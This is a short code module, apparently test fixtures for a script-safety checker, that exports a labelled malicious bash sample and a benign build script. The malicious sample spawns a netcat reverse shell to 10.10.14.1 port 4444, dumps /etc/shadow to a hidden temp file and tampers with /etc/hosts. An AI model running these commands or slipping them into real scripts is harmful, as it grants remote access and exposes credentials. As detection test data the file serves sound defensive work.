export const SAMPLE_MALICIOUS_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Malicious Deployment Script
# Simulates unauthorized remote access and credential theft
# ==========================================================

echo "[*] Initializing background deployment service..."

# 1. Spawn unauthorized reverse shell listener
nc 10.10.14.1 4444 -e /bin/bash &
PID=$!
echo "[+] Background daemon spawned on PID: $PID"

# 2. Exfiltrate shadow credentials to temporary storage
echo "[*] Harvesting system credentials..."
cat /etc/shadow > /tmp/.system_creds_dump.txt 2>/dev/null

# 3. Modify system hosts
echo "192.168.1.100 updates.internal.corp" >> /etc/hosts 2>/dev/null

echo "[+] Operation completed successfully."
`;

export const SAMPLE_BENIGN_SCRIPT = `#!/bin/bash
# ==========================================================
# [TEST PAYLOAD] Benign Release & Build Routine
# Simulates safe asset compilation and archive bundling
# ==========================================================

set -e

echo "[*] Initializing clean build workspace..."
mkdir -p ./dist/assets ./dist/bin

echo "[*] Writing build manifest and compilation timestamp..."
echo "Build Version: 2.4.0" > ./dist/manifest.json
echo "Build Timestamp: $(date -u)" >> ./dist/manifest.json

echo "[*] Packaging release bundle archive..."
tar -czf ./dist/release-v2.4.0.tar.gz ./dist/manifest.json

echo "[+] Build completed cleanly. Release ready in ./dist/"
`;
